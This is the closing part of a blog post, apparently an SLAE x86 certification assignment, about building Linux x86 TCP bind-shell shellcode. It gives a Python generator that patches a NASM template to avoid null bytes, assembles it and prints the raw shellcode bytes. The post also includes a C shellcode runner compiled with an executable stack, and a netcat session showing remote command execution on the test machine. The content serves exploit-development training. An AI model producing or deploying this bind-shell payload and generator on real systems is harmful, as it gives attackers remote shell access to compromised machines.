<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">stdout</span>
    <span class="n">shellcode_string</span> <span class="o">=</span> <span class="s">""</span>

    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
        <span class="n">shellcode_string</span> <span class="o">+=</span> <span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="n">b</span><span class="p">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">"</span>

    <span class="k">if</span> <span class="mh">0x00</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] Found NULL byte in shellcode"</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Shellcode length: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Shellcode:"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'"</span><span class="si">{</span><span class="n">shellcode_string</span><span class="si">}</span><span class="s">";'</span><span class="p">)</span>
</code></pre></div></div>
<p><sub class='aside'>I wrote the function <code>print_shellcode</code> in order to extract the executable code from the <code>.text</code> section of the object file. It allows you to easily paste the shellcode into the shellcode runner
</sub></p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">generate_shellcode</span><span class="p">(</span><span class="n">output_file_path</span><span class="p">):</span>

    <span class="n">object_file_path</span> <span class="o">=</span> <span class="n">output_file_path</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">".nasm"</span><span class="p">,</span> <span class="s">".o"</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">executable_path</span> <span class="o">=</span> <span class="n">output_file_path</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">".nasm"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">"nasm -f elf32 -o </span><span class="si">{</span><span class="n">object_file_path</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">output_file_path</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">"ld -m elf_i386 -o </span><span class="si">{</span><span class="n">executable_path</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">object_file_path</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>
<p><sub class='aside'>The program also requires <code>nasm</code> and <code>ld</code>, the latter should be present by default on Linux systems
</sub></p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Object file generated at </span><span class="si">{</span><span class="n">output_file_path</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Executable binary generated at </span><span class="si">{</span><span class="n">executable_path</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

        <span class="n">print_shellcode</span><span class="p">(</span><span class="n">object_file_path</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">traceback</span><span class="p">.</span><span class="n">format_exc</span><span class="p">())</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">replace_template_values</span><span class="p">(</span><span class="n">template_name</span><span class="p">,</span> <span class="n">tcp_port</span><span class="p">,</span> <span class="n">output_file_path</span><span class="p">):</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">template_name</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">template_code</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

    <span class="n">tcp_port_hex</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcp_port</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"little"</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span>

    <span class="k">if</span> <span class="s">'00'</span> <span class="ow">in</span> <span class="n">tcp_port_hex</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">'00'</span> <span class="ow">in</span> <span class="n">tcp_port_hex</span><span class="p">[:</span><span class="mi">2</span><span class="p">]:</span>
            <span class="n">non_null_byte</span> <span class="o">=</span> <span class="n">tcp_port_hex</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
            <span class="n">replace_code</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"mov bl, 0x</span><span class="si">{</span><span class="n">non_null_byte</span><span class="si">}</span><span class="se">\n</span><span class="s">    push bx</span><span class="se">\n</span><span class="s">    xor ebx, ebx"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">non_null_byte</span> <span class="o">=</span> <span class="n">tcp_port_hex</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span>
            <span class="n">replace_code</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"mov bh, 0x</span><span class="si">{</span><span class="n">non_null_byte</span><span class="si">}</span><span class="se">\n</span><span class="s">    push bx</span><span class="se">\n</span><span class="s">    xor ebx, ebx"</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">replace_code</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"push WORD 0x</span><span class="si">{</span><span class="n">tcp_port_hex</span><span class="si">}</span><span class="s">"</span>
</code></pre></div></div>
<p><sub class='aside'>These last instructions allows you avoid <code>NULL</code> bytes in the TCP port number. For example, the port <code>256</code> is converted to <code>0x0001</code> (big endian), while port <code>80</code> is converted to <code>0x5000</code>
</sub></p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">template_code</span> <span class="o">=</span> <span class="n">template_code</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">""</span><span class="p">,</span> <span class="n">replace_code</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file_path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">template_code</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'TCP Port for the Bind Shell'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">"[1-65535]"</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span> <span class="s">'--template'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Path of the NASM template file. Example: -t /tmp/template.nasm'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-o'</span><span class="p">,</span> <span class="s">'--output'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Path for the output file. Example: -o /tmp/output.nasm'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="n">tcp_port</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span>
    <span class="k">if</span> <span class="n">tcp_port</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65536</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[!] Argument '--port' must be in range [1-65535]"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">shellcode_template</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">template</span>
    <span class="n">output_file_path</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">output</span>

    <span class="n">replace_template_values</span><span class="p">(</span><span class="n">shellcode_template</span><span class="p">,</span> <span class="n">tcp_port</span><span class="p">,</span> <span class="n">output_file_path</span><span class="p">)</span>
    <span class="n">generate_shellcode</span><span class="p">(</span><span class="n">output_file_path</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>

    <span class="n">main</span><span class="p">()</span>

</code></pre></div></div>
<p>Thanks to <code>argparse</code>, when you run the script, it asks you for the required arguments:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 script.py <span class="nt">-h</span>

<span class="c"># usage: script.py [-h] -p [1-65535] -t TEMPLATE -o OUTPUT</span>

<span class="c"># optional arguments:</span>
<span class="c">#   -h, --help            show this help message and exit</span>
<span class="c">#   -p [1-65535], --port [1-65535]</span>
<span class="c">#                         TCP Port for the Bind Shell</span>
<span class="c">#   -t TEMPLATE, --template TEMPLATE</span>
<span class="c">#                         Path of the NASM template file. Example: -t /tmp/template.nasm</span>
<span class="c">#   -o OUTPUT, --output OUTPUT</span>
<span class="c">#                         Path for the output file. Example: -o /tmp/output.nasm</span>
</code></pre></div></div>
<p>If you pass the required arguments, it finally prints the shellcode which you can copy into a shellcode runner. Follows an example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 script.py <span class="nt">-p</span> 80 <span class="nt">-t</span> ./template.nasm <span class="nt">-o</span> /tmp/output.nasm

<span class="c"># [+] Object file generated at /tmp/output.nasm</span>
<span class="c"># [+] Executable binary generated at /tmp/output</span>
<span class="c"># [+] Shellcode length: 133 bytes</span>
<span class="c"># [+] Shellcode:</span>
<span class="c"># "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\xb7\x50\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb8\x0b\x00\x00\x00\xcd\x80";</span>
</code></pre></div></div>
<p>As I mentioned previously in the sidenotes, the script requires the following binaries:</p>
<ul>
<li><code>objcopy</code> (from the package <code>binutils</code>)</li>
<li><code>nasm</code> (from the homonymous package)</li>
<li><code>ld</code> (The GNU linker)</li>
</ul>
<p>The python script and the <code>NASM</code> template are stored inside the aforementioned Git repository, to be more specific they can be found in the folder <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/1/attempt/final/automation">attempt/final/automation</a>.</p>
<h2 id="testing">Testing</h2>
<p>As regards the testing phase, I decided to use the python script to generate shellcode for a Bind Shell listening on the TCP port <code>1234</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 script.py <span class="nt">-p</span> 1234 <span class="nt">-t</span> ./template.nasm <span class="nt">-o</span> /tmp/output.nasm

<span class="c"># [+] Object file generated at /tmp/output.nasm</span>
<span class="c"># [+] Executable binary generated at /tmp/output</span>
<span class="c"># [+] Shellcode length: 130 bytes</span>
<span class="c"># [+] Shellcode:</span>
<span class="c"># "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";</span>
</code></pre></div></div>
<p>To test the shellcode generated by the python script, I used the following C <code>shellcode runner</code>:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb3\x01\xb1\x06\x51\x53\xb1\x02\x51\x89\xe1\xcd\x80\x4b\x53\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\xc0\xc3\x03\x53\x51\x89\xc6\x50\x31\xc0\xb0\x66\xc0\xcb\x03\x89\xe1\xcd\x80\xb3\x01\x6a\x01\x56\x89\xd8\xb0\x66\xc0\xc3\x02\x89\xe1\xcd\x80\xc0\xc3\x02\x53\x31\xdb\x53\x53\x56\x89\xd8\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xd9\xb3\x03\x89\xc7\x51\xb0\x3f\x89\xfb\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x89\xe1\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>

<span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>

    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
    <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Compile and run it:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack <span class="nt">-o</span> tcp_bind_shell shellcode_runner.c
./tcp_bind_shell
</code></pre></div></div>
<p>Finally, I confirmed I could connect with <code>netcat</code> and execute commands:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rbct@slae:~<span class="nv">$ </span>nc 127.0.0.1 1234
<span class="nb">whoami
</span>rbct
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>rbct<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>rbct<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>rbct<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,111<span class="o">(</span>lpadmin<span class="o">)</span>,112<span class="o">(</span>sambashare<span class="o">)</span>
<span class="nb">exit
</span>rbct@slae:~<span class="err">$</span>
</code></pre></div></div>


            <footer class="tags">
                <section class="mono tags">
                    Tagged

                    
                    <a href="/tags#slae">slae</a>, <a href="/tags#x86">x86</a>, <a href="/tags#assembly">assembly</a>, <a href="/tags#shellcode">shellcode</a>, <a href="/tags#nasm">nasm</a>, <a href="/tags#c">c</a>, <a href="/tags#exam">exam</a>, <a href="/tags#python">python</a>
                </section><section class="pagination">
                        <a href="/21/12/19/slae32-assignment-2">
                            <div class="mono">NEXT</div>
                            SLAE x86 Exam - Assignment #2
                        </a>
                    </section></footer>
        </main>
    </article>
  </body>
</html>
